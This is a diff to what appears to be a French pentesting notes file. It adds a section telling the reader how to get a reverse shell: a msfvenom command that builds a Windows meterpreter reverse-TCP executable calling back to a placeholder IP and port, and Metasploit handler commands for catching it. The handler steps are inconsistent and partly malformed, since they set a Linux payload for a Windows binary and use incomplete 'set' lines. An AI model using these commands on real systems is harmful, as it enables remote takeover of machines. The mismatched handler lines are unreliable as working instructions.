@@ -152,3 +152,17 @@ windapsearch : Recherche sur LDAP (si soucis d'installation faire :
 sudo pip2 install ldap3 
 sudo apt install python3-ldap 
 ```
+
+# MSFCONSOLE
+
+Quand tu as besoin d'un reverse shell :
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+```
+```
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+show options
+set <RHOST>
+set <PORT>
+```
